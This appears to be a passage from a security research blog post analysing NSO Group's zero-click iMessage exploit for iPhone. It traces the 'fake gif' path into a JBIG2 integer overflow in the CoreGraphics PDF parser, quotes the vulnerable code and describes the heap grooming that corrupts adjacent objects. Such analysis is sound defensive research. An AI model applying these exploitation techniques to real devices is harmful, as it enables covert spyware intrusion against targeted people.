 <p class="c3"><span>The vulnerability discussed in this blog post was fixed on September 13, 2021 in </span><span class="c16"><a class="c21" href="https://support.apple.com/en-us/HT212807">iOS 14.8</a></span><span>&nbsp;as CVE-2021-30860.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c14 c8">NSO</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c16"><a class="c21" href="https://en.wikipedia.org/wiki/NSO_Group">NSO</a></span><span class="c16"><a class="c21" href="https://en.wikipedia.org/wiki/NSO_Group">&nbsp;Group</a></span><span>&nbsp;</span><span>is</span><span>&nbsp;one of the </span><span class="c16"><a class="c21" href="https://www.atlanticcouncil.org/in-depth-research-reports/report/countering-cyber-proliferation-zeroing-in-on-access-as-a-service/">highest-profile providers of &quot;access-as-a-service&quot;</a></span><span>, selling packaged hacking solutions which </span><span class="c16"><a class="c21" href="https://www.atlanticcouncil.org/in-depth-research-reports/issue-brief/surveillance-technology-at-the-fair/">enable nation state actors without a home-grown offensive cyber capability to &quot;pay-to-play&quot;</a></span><span class="c5">, vastly expanding the number of nations with such cyber capabilities.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>For years, groups like Citizen Lab and Amnesty International have been tracking the use of NSO&#39;s mobile spyware package &quot;Pegasus&quot;. Despite NSO&#39;s claims that they &quot;</span><span class="c16"><a class="c21" href="https://www.nsogroup.com/governance/human-rights-policy/">[evaluate] the potential for adverse human rights impacts arising from the misuse of NSO products</a></span><span>&quot; Pegasus has been linked to </span><span class="c16"><a class="c21" href="https://citizenlab.ca/2020/01/stopping-the-press-new-york-times-journalist-targeted-by-saudi-linked-pegasus-spyware-operator/">the hacking of the New York Times journalist Ben Hubbard by the Saudi regime</a></span><span>,</span><span>&nbsp;</span><span class="c16"><a class="c21" href="https://www.amnesty.org/en/latest/research/2019/10/morocco-human-rights-defenders-targeted-with-nso-groups-spyware/">hacking of human rights defenders in Morocco</a></span><span>&nbsp;and </span><span class="c16"><a class="c21" href="https://citizenlab.ca/2021/08/bahrain-hacks-activists-with-nso-group-zero-click-iphone-exploits/">Bahrain</a></span><span>, </span><span class="c16"><a class="c21" href="https://www.amnesty.org/en/latest/research/2018/08/amnesty-international-among-targets-of-nso-powered-campaign/">the targeting of Amnesty International staff</a></span><span class="c5">&nbsp;and dozens of other cases.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>Last month the United States added NSO to the &quot;Entity List&quot;, severely restricting the ability of US companies to do business with NSO and </span><span class="c16"><a class="c21" href="https://www.commerce.gov/news/press-releases/2021/11/commerce-adds-nso-group-and-other-foreign-companies-entity-list">stating in a press release</a></span><span>&nbsp;that &quot;[NSO&#39;s tools] enabled foreign governments to conduct transnational repression, which is the practice of authoritarian governments targeting dissidents, journalists and activists outside of their sovereign borders to silence dissent.&quot;</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>Citizen Lab was able to recover these Pegasus exploits from an iPhone and therefore this analysis covers NSO&#39;s capabilities against iPhone. We are aware that NSO sells similar zero-click capabilities which target Android devices; Project Zero</span><span>&nbsp;does not have samples of these exploits</span><span>&nbsp;but if you do, </span><span>please reach out.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c14 c8">From One to Zero</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>In previous cases such as the </span><span class="c16"><a class="c21" href="https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/">Million Dollar Dissident from 2016</a></span><span class="c5">, targets were sent links in SMS messages:</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"></p>
  
 <p class="c3"><span class="c5"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvP0VlEQXC6TZWOu-zPOWC-Pnyy3uqOJpwPeP3Y_rz-ZO_MvrqjiMtMwxzIz_E8NdNyrV_Fvx-RRApoMxAPrYQcHO4eiico20He9zMm3UT5-j84CCRZDJq5hjMmeIKd0aLMsflCkfrfVHp1z1PbQmYPFX6UlVtn6_gF8P6iTQaAHL3EQ6iKs4VDdEZ/s870/image2%281%29.jpg" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvP0VlEQXC6TZWOu-zPOWC-Pnyy3uqOJpwPeP3Y_rz-ZO_MvrqjiMtMwxzIz_E8NdNyrV_Fvx-RRApoMxAPrYQcHO4eiico20He9zMm3UT5-j84CCRZDJq5hjMmeIKd0aLMsflCkfrfVHp1z1PbQmYPFX6UlVtn6_gF8P6iTQaAHL3EQ6iKs4VDdEZ/s870/image2%281%29.jpg" border="0" alt="" style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c12"><span class="c9 c7">Screenshots of Phishing SMSs reported to Citizen Lab in 2016</span></p>
 <p class="c12"><span class="c7">source: </span><span class="c16 c7"><a class="c21" href="https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/">https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/</a></span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>The target was only hacked when they clicked the link, a technique known as a one-click exploit. Recently, however, it has been documented that NSO is offering their clients zero-click exploitation technology, where even very technically savvy targets who might not click a phishing link are completely unaware they are being targeted. In the zero-click scenario no user interaction is required. Meaning, t</span><span>he attacker doesn&#39;t need to send phishing messages; the exploit just works silently in the background</span><span>. Short of not using a device, t</span><span>here is no way to prevent exploitation by a zero-click exploit; it&#39;s a weapon against which there is no defense</span><span>.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c8">One weird trick</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c5">The initial entry point for Pegasus on iPhone is iMessage. This means that a victim can be targeted just using their phone number or AppleID username.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>iMessage has native support for GIF images, the typically small and low quality animated images popular in meme culture. You can send and receive GIFs in iMessage chats and they show up in the chat window. Apple wanted to make those GIFs loop endlessly rather than only play once, so very early on in the </span><span class="c16"><a class="c21" href="https://googleprojectzero.blogspot.com/2021/01/a-look-at-imessage-in-ios-14.html">iMessage parsing and processing pipeline</a></span><span>&nbsp;(after a message has been received but well before the message is shown), iMessage calls the following method in the </span><span class="c6">IMTranscoderAgent</span><span>&nbsp;process</span><span>&nbsp;(outside the &quot;BlastDoor&quot; sandbox), passing any image file received with the extension </span><span class="c15">.gif</span><span class="c5">:</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c15 c23">&nbsp; [IMGIFUtils copyGifFromPath:toDestinationPath:error]</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>Looking at the selector name, the intention here was probably to just copy the GIF file before editing the loop count field, but the semantics of this method are different. Under the hood it uses the CoreGraphics APIs to </span><span class="c7">render</span><span>&nbsp;the source image to a </span><span class="c7">new</span><span>&nbsp;GIF file at the destination path. And just because the source filename has to end in </span><span class="c15">.gif</span><span class="c5">, that doesn&#39;t mean it&#39;s really a GIF file.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>The ImageIO library, </span><span class="c16"><a class="c21" href="https://googleprojectzero.blogspot.com/2020/04/fuzzing-imageio.html">as detailed in a previous Project Zero blogpost</a></span><span class="c5">, is used to guess the correct format of the source file and parse it, completely ignoring the file extension. Using this &quot;fake gif&quot; trick, over 20 image codecs are suddenly part of the iMessage zero-click attack surface, including some very obscure and complex formats, remotely exposing probably hundreds of thousands of lines of code. </span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c5">Note: Apple inform us that they have restricted the available ImageIO formats reachable from IMTranscoderAgent starting in iOS 14.8.1 (26 October 2021), and completely removed the GIF code path from IMTranscoderAgent starting in iOS 15.0 (20 September 2021), with GIF decoding taking place entirely within BlastDoor.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c8">A PDF in your GIF</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c5">NSO uses the &quot;fake gif&quot; trick to target a vulnerability in the CoreGraphics PDF parser.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>PDF was a popular target for exploitation around a decade ago, due to its ubiquity and complexity. Plus, the availability of javascript inside PDFs made development of reliable exploits far easier. The CoreGraphics PDF parser doesn&#39;t </span><span class="c7">seem</span><span class="c5">&nbsp;to interpret javascript, but NSO managed to find something equally powerful inside the CoreGraphics PDF parser...</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c14 c8">Extreme compression</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>In the late 1990&#39;s, bandwidth and storage were much more scarce than they are now. It was in that environment that the </span><span class="c16"><a class="c21" href="https://en.wikipedia.org/wiki/JBIG2">JBIG2</a></span><span class="c5">&nbsp;standard emerged. JBIG2 is a domain specific image codec designed to compress images where pixels can only be black or white.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>It was developed to achieve extremely high compression ratios for scans of text documents and was implemented and used in high-end office scanner/printer devices like the XEROX WorkCenter device shown below. If you used the </span><span class="c7">scan to pdf</span><span>&nbsp;functionality of a device like this a decade ago, your PDF likely had a JBIG2 stream in it.</span><span class="c5"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj3gos8L_dEuVS2ltgPw-T3WxC6COMIyYoq4DlSN8Z8XgNueXzXBBlQF_BusBrKSJowwIu0OouJLMwZwPZyMiORoXCShUtbb65C3ZkKU9Tzo8ANc5862ImuSa9v1pjcjxR2v4T-UdpMYlV7DEsVgr43Mj3yAjHn_EXcxVxXFhxHqq1QXoEdP3S1JnRm/s700/image10.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj3gos8L_dEuVS2ltgPw-T3WxC6COMIyYoq4DlSN8Z8XgNueXzXBBlQF_BusBrKSJowwIu0OouJLMwZwPZyMiORoXCShUtbb65C3ZkKU9Tzo8ANc5862ImuSa9v1pjcjxR2v4T-UdpMYlV7DEsVgr43Mj3yAjHn_EXcxVxXFhxHqq1QXoEdP3S1JnRm/s700/image10.png" border="0" alt="" style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c12"><span class="c9 c7">A Xerox WorkCentre 7500 series multifunction printer, which used JBIG2</span></p>
 <p class="c12"><span class="c7">for its scan-to-pdf functionality</span></p>
 <p class="c12"><span class="c7">source: </span><span class="c16 c7"><a class="c21" href="https://www.office.xerox.com/en-us/multifunction-printers/workcentre-7545-7556/specifications">https://www.office.xerox.com/en-us/multifunction-printers/workcentre-7545-7556/specifications</a></span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c5">The PDFs files produced by those scanners were exceptionally small, perhaps only a few kilobytes. There are two novel techniques which JBIG2 uses to achieve these extreme compression ratios which are relevant to this exploit:</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c8">Technique</span><span class="c8">&nbsp;1: </span><span class="c14 c8">Segmentation and substitution</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>Effectively every text document, especially those written in languages with small alphabets like English or German, consists of many repeated letters (also known as </span><span class="c7">glyphs</span><span class="c5">) on each page. JBIG2 tries to segment each page into glyphs then uses simple pattern matching to match up glyphs which look the same:</span></p>
 <p class="c4"></p>
  
 <p class="c4"><span class="c5"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi2YXgDQeGK1E3GixB5S11rI1e7Xqi3cQJKuL4ZklPLYw8U1hbbEDXGOyCfcqqhoQT2evw5kHYC3Ba9RWx21XHknWvjxFKg5te5-K19ZYaoTR2wD4AmBw_c-9RXNUuonuD2TT21aTlvihuC_i_t3GgYFjw2pzL7YshGF7BZa4bq-i44V63NN6Pv7yzy/s352/image4%284%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi2YXgDQeGK1E3GixB5S11rI1e7Xqi3cQJKuL4ZklPLYw8U1hbbEDXGOyCfcqqhoQT2evw5kHYC3Ba9RWx21XHknWvjxFKg5te5-K19ZYaoTR2wD4AmBw_c-9RXNUuonuD2TT21aTlvihuC_i_t3GgYFjw2pzL7YshGF7BZa4bq-i44V63NN6Pv7yzy/s352/image4%284%29.png" border="0" alt="" style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c12"><span class="c9 c7">Simple pattern matching can find all the shapes which look similar on a page,</span></p>
 <p class="c12"><span class="c9 c7">in this case all the &#39;e&#39;s</span></p>
 <p class="c1"><span class="c9 c7"></span></p>
 <p class="c3"><span>JBIG2 doesn&#39;t actually know anything about glyphs and it isn&#39;t doing OCR (optical character recognition.) A JBIG encoder is just looking for connected regions of pixels and grouping similar looking regions together. The compression algorithm is to simply substitute all </span><span class="c7">sufficiently-similar</span><span class="c5">&nbsp;looking regions with a copy of just one of them:</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c4"></p>
  
 <p class="c4"><span class="c5"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2k3SPN7fikk3DnL-5YdWTK6_n1JTjvlb6qC-4tVnHeqU16cM6VWYjmMzNL9ZwMK0MXOhWITS_P0kgsx3YFHDaI2Rd5R8f1CM55ccmCBROIlyymNW2jSSCRWCpddWLuIzhGG6uB8PDKcDg5IpWW7NjdvVPZRFme3Hk4EHHmXZwEJYoohHgaVa31w0u/s327/image1%285%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2k3SPN7fikk3DnL-5YdWTK6_n1JTjvlb6qC-4tVnHeqU16cM6VWYjmMzNL9ZwMK0MXOhWITS_P0kgsx3YFHDaI2Rd5R8f1CM55ccmCBROIlyymNW2jSSCRWCpddWLuIzhGG6uB8PDKcDg5IpWW7NjdvVPZRFme3Hk4EHHmXZwEJYoohHgaVa31w0u/s327/image1%285%29.png" border="0" alt="" style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c12"><span class="c9 c7">Replacing all occurrences of similar glyphs with a copy of just one often yields a document which is still quite legible and enables very high compression ratios</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c5">In this case the output is perfectly readable but the amount of information to be stored is significantly reduced. Rather than needing to store all the original pixel information for the whole page you only need a compressed version of the &quot;reference glyph&quot; for each character and the relative coordinates of all the places where copies should be made. The decompression algorithm then treats the output page like a canvas and &quot;draws&quot; the exact same glyph at all the stored locations.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>There&#39;s a significant issue with such a scheme: it&#39;s far too easy for a poor encoder to accidentally swap similar looking characters, and this can happen with interesting consequences. </span><span class="c16"><a class="c21" href="http://www.dkriesel.com/en/blog/2013/0802_xerox-workcentres_are_switching_written_numbers_when_scanning">D. Kriesel&#39;s blog has some motivating examples</a></span><span>&nbsp;where PDFs of scanned invoices have different figures or PDFs of scanned construction drawings end up with incorrect measurements. These aren&#39;t the issues we&#39;re looking at, but they are one significant reason why JBIG2 is not a common compression format anymore.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c8">Technique </span><span class="c8">2: </span><span class="c8">Refinement coding</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c5">As mentioned above, the substitution based compression output is lossy. After a round of compression and decompression the rendered output doesn&#39;t look exactly like the input. But JBIG2 also supports lossless compression as well as an intermediate &quot;less lossy&quot; compression mode.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>It does this by also storing (and compressing) the </span><span class="c7">difference</span><span class="c5">&nbsp;between the substituted glyph and each original glyph. Here&#39;s an example showing a difference mask between a substituted character on the left and the original lossless character in the middle:</span></p>
 <p class="c4"></p>
  
 <p class="c4"><span class="c5"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh-7RiEuIp4vanQlf6nxJf1tfbuA7B61DISNjLlNxXrvSqFnqxcvSLPN6_60h2ypZdjDKHtNmCN3Nr5W66JaLw_j5iSxxntOZ0eXFB2wEQHfUjs_9LIwmckCXdTzurtKgpwyaWkGfInvM35YC3kp_K4qyJYxV4HDEf0E9W_Zqt3OelULvnfSlWAc2Kw/s267/image3%285%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh-7RiEuIp4vanQlf6nxJf1tfbuA7B61DISNjLlNxXrvSqFnqxcvSLPN6_60h2ypZdjDKHtNmCN3Nr5W66JaLw_j5iSxxntOZ0eXFB2wEQHfUjs_9LIwmckCXdTzurtKgpwyaWkGfInvM35YC3kp_K4qyJYxV4HDEf0E9W_Zqt3OelULvnfSlWAc2Kw/s267/image3%285%29.png" border="0" alt="" style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c12"><span class="c9 c7">Using the XOR operator on bitmaps to compute a difference image</span></p>
 <p class="c1"><span class="c5"></span></p>
 <p class="c3"><span class="c5">In this simple example the encoder can store the difference mask shown on the right, then during decompression the difference mask can be XORed with the substituted character to recover the exact pixels making up the original character. There are some more tricks outside of the scope of this blog post to further compress that difference mask using the intermediate forms of the substituted character as a &quot;context&quot; for the compression.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>Rather than completely encoding the entire difference in one go, it can be done in steps, with each iteration using a logical operator (one of AND, OR, XOR or XNOR) to set, clear or flip bits. Each successive refinement step brings the rendered output closer to the original and this allows a level of control over the &quot;</span><span>lossiness</span><span class="c5">&quot; of the compression. The implementation of these refinement coding steps is very flexible and they are also able to &quot;read&quot; values already present on the output canvas.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c14 c8">A JBIG2 stream</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>Most of the CoreGraphics PDF decoder appears to be Apple proprietary code, but the JBIG2 implementation is from Xpdf, </span><span class="c16"><a class="c21" href="https://www.xpdfreader.com/download.html">the source code for which is freely available</a></span><span class="c5">.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c5">The JBIG2 format is a series of segments, which can be thought of as a series of drawing commands which are executed sequentially in a single pass. The CoreGraphics JBIG2 parser supports 19 different segment types which include operations like defining a new page, decoding a huffman table or rendering a bitmap to given coordinates on the page.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>Segments are represented by the class </span><span class="c6">JBIG2Segment</span><span>&nbsp;and its subclasses </span><span class="c6">JBIG2Bitmap</span><span>&nbsp;and </span><span class="c6">JBIG2SymbolDict</span><span class="c5">.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>A </span><span class="c6">JBIG2Bitmap</span><span>&nbsp;represents a rectangular array of pixels. Its </span><span class="c6">data</span><span class="c5">&nbsp;field points to a backing-buffer containing the rendering canvas.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>A </span><span class="c6">JBIG2SymbolDict</span><span>&nbsp;groups </span><span class="c6">JBIG2Bitmaps</span><span>&nbsp;together. The destination page is represented as a </span><span class="c6">JBIG2Bitmap</span><span class="c5">, as are individual glyphs.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c6">JBIG2Segments</span><span>&nbsp;can be referred to by a segment number and the </span><span class="c6">GList</span><span>&nbsp;vector type stores pointers to all the </span><span class="c6">JBIG2Segments</span><span>. To look up a segment by segment number the </span><span class="c6">GList</span><span>&nbsp;is scanned sequentially.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c14 c8">The vulnerability</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c5">The vulnerability is a classic integer overflow when collating referenced segments:</span></p>
 <p class="c3 c10"><span class="c5"></span></p><a id="t.7ed94ce0bf920398965583c15daf9916cc6dcfb3"></a><a id="t.0"></a><table class="c22"><tbody><tr class="c11"><td class="c13" colspan="1" rowspan="1">
 <p class="c3"><span class="c6">&nbsp; </span><span class="c0 c18">Guint numSyms; // (1)</span></p>
 <p class="c3 c10"><span class="c0"></span></p>
 <p class="c3"><span class="c0">&nbsp; numSyms = 0;</span></p>
 <p class="c3"><span class="c0">&nbsp; for (i = 0; i &lt; nRefSegs; ++i) {</span></p>
 <p class="c3"><span class="c0">&nbsp; &nbsp; if ((seg = findSegment(refSegs[i]))) {</span></p>
 <p class="c3"><span class="c0">&nbsp; &nbsp; &nbsp; if (seg-&gt;getType() == jbig2SegSymbolDict) {</span></p>
 <p class="c3"><span class="c6">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c0 c18">numSyms += ((JBIG2SymbolDict *)seg)-&gt;getSize(); &nbsp;// (2)</span></p>
 <p class="c3"><span class="c0">&nbsp; &nbsp; &nbsp; } else if (seg-&gt;getType() == jbig2SegCodeTable) {</span></p>
 <p class="c3"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; codeTables-&gt;append(seg);</span></p>
 <p class="c3"><span class="c0">&nbsp; &nbsp; &nbsp; }</span></p>
 <p class="c3"><span class="c0">&nbsp; &nbsp; } else {</span></p>
 <p class="c3"><span class="c0">&nbsp; &nbsp; &nbsp; error(errSyntaxError, getPos(),</span></p>
 <p class="c3"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;Invalid segment reference in JBIG2 text region&quot;);</span></p>
 <p class="c3"><span class="c0">&nbsp; &nbsp; &nbsp; delete codeTables;</span></p>
 <p class="c3"><span class="c0">&nbsp; &nbsp; &nbsp; return;</span></p>
 <p class="c3"><span class="c0">&nbsp; &nbsp; }</span></p>
 <p class="c3"><span class="c0">&nbsp; }</span></p>
 <p class="c3"><span class="c0">...</span></p>
 <p class="c3"><span class="c0">&nbsp; // get the symbol bitmaps</span></p>
 <p class="c3"><span class="c6">&nbsp; </span><span class="c6 c18">syms = (</span><span class="c6 c18">JBIG2Bitmap</span><span class="c6 c18">&nbsp;**)gmallocn(numSyms, sizeof(</span><span class="c6 c18">JBIG2Bitmap</span><span class="c0 c18">&nbsp;*)); // (3)</span></p>
 <p class="c3 c10"><span class="c0"></span></p>
 <p class="c3"><span class="c0">&nbsp; kk = 0;</span></p>
 <p class="c3"><span class="c0">&nbsp; for (i = 0; i &lt; nRefSegs; ++i) {</span></p>
 <p class="c3"><span class="c0">&nbsp; &nbsp; if ((seg = findSegment(refSegs[i]))) {</span></p>
 <p class="c3"><span class="c0">&nbsp; &nbsp; &nbsp; if (seg-&gt;getType() == jbig2SegSymbolDict) {</span></p>
 <p class="c3"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; symbolDict = (JBIG2SymbolDict *)seg;</span></p>
 <p class="c3"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; for (k = 0; k &lt; symbolDict-&gt;getSize(); ++k) {</span></p>
 <p class="c3"><span class="c6">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c0 c18">syms[kk++] = symbolDict-&gt;getBitmap(k); // (4)</span></p>
 <p class="c3"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; }</span></p>
 <p class="c3"><span class="c0">&nbsp; &nbsp; &nbsp; }</span></p>
 <p class="c3"><span class="c0">&nbsp; &nbsp; }</span></p>
 <p class="c21"><span class="c6">&nbsp; }</span></p></td></tr></tbody></table>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c6">numSyms</span><span>&nbsp;is a 32-bit integer declared at </span><span class="c6">(1)</span><span>. By supplying carefully crafted </span><span>reference segments</span><span>&nbsp;it&#39;s possible for the repeated addition at </span><span class="c6">(2)</span><span>&nbsp;to cause </span><span class="c6">numSyms</span><span class="c5">&nbsp;to overflow to a controlled, small value.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>That smaller value is used for the heap allocation size at </span><span class="c6">(3)</span><span>&nbsp;meaning </span><span class="c6">syms</span><span class="c5">&nbsp;points to an undersized buffer.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>Inside the inner-most loop at </span><span class="c6">(4)</span><span>&nbsp;</span><span class="c6">JBIG2Bitmap</span><span>&nbsp;pointer values are written into the undersized </span><span class="c6">syms</span><span class="c5">&nbsp;buffer.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>Without another trick this loop would write over 32GB of data into the undersized </span><span class="c6">syms</span><span>&nbsp;buffer, certainly causing a crash. To avoid that crash the heap is groomed such that the first few writes off of the end of the </span><span class="c6">syms</span><span>&nbsp;buffer corrupt the </span><span class="c6">GList</span><span>&nbsp;backing buffer. This </span><span class="c6">GList</span><span>&nbsp;stores all known segments and is used by the </span><span class="c6">findSegments</span><span>&nbsp;routine to map from the segment numbers passed in </span><span class="c6">refSegs</span><span>&nbsp;to </span><span class="c6">JBIG2Segment</span><span>&nbsp;pointers. The overflow causes the JBIG2Segment pointers in the GList to be overwritten with </span><span class="c6">JBIG2Bitmap</span><span>&nbsp;pointers at </span><span class="c6">(4)</span><span class="c5">.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>Conveniently since </span><span class="c6">JBIG2Bitmap</span><span>&nbsp;inherits from </span><span class="c6">JBIG2Segment</span><span>&nbsp;the </span><span class="c6">seg-&gt;getType()</span><span>&nbsp;virtual call succeed even on devices where Pointer Authentication is enabled (which is used to perform a weak type check on virtual calls) but the returned type will now </span><span class="c8">not</span><span>&nbsp;be equal to </span><span class="c6">jbig2SegSymbolDict</span><span>&nbsp;thus causing further writes at </span><span class="c6">(4)</span><span>&nbsp;to not be reached and bounding the extent of the memory corruption</span><span>.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c4"></p>
  
  
 <p class="c4"><span class="c5"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9fFsg7COjTu5Aq2rV9CTyka-eczC_BvD3wrGUP3XL5W9RHoGOKElzDMbDWLrgp1BJfRvEjcw36ZdMgbA2iwnjj0jqDKGBS94UL2tdcH0evSr66V5uGUrhra3PlGyKvCznPT2rSUL3ZegDR-FXRbKw6SJFzNrgubTbAzKXKVrga6h-B3VcHFqOU9zx/s506/image6%282%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9fFsg7COjTu5Aq2rV9CTyka-eczC_BvD3wrGUP3XL5W9RHoGOKElzDMbDWLrgp1BJfRvEjcw36ZdMgbA2iwnjj0jqDKGBS94UL2tdcH0evSr66V5uGUrhra3PlGyKvCznPT2rSUL3ZegDR-FXRbKw6SJFzNrgubTbAzKXKVrga6h-B3VcHFqOU9zx/s506/image6%282%29.png" border="0" alt="" style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c12"><span class="c9 c7">A simplified view of the memory layout when the heap overflow occurs showing the undersized-buffer below the GList backing buffer and the JBIG2Bitmap</span></p>
 <p class="c1"><span class="c9 c7"></span></p>
 <p class="c3"><span class="c8 c14">Boundless unbounding</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>Directly after the corrupted segments </span><span class="c6">GList</span><span>, the attacker grooms the </span><span class="c6">JBIG2Bitmap</span><span class="c5">&nbsp;object which represents the current page (the place to where current drawing commands render). </span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c6">JBIG2Bitmaps</span><span class="c5">&nbsp;are simple wrappers around a backing buffer, storing the buffer&rsquo;s width and height (in bits) as well as a line value which defines how many bytes are stored for each line.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c4"></p>
  
 <p class="c4"><span class="c5"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0hdaagzsqy4Esf9vjf9KS6euQUhDYTUMu9xDO8q4nxUCbVjpLmxBCJkixLWpg8YETgQNC-2DYLlPss0Eo46knC-qDRI0dLEcOHPvjbwGfaF_E_7EimexamWDy68_id27V2y9k0J2moeJg94okQoOtrMyejAg7bYepIgtdcgNH7NRz7Ne-mWeWs1QA/s1070/image7%282%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0hdaagzsqy4Esf9vjf9KS6euQUhDYTUMu9xDO8q4nxUCbVjpLmxBCJkixLWpg8YETgQNC-2DYLlPss0Eo46knC-qDRI0dLEcOHPvjbwGfaF_E_7EimexamWDy68_id27V2y9k0J2moeJg94okQoOtrMyejAg7bYepIgtdcgNH7NRz7Ne-mWeWs1QA/s1070/image7%282%29.png" border="0" alt="" style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c12"><span class="c9 c7">The memory layout of the JBIG2Bitmap object showing the segnum, w, h and line fields which are corrupted during the overflow</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
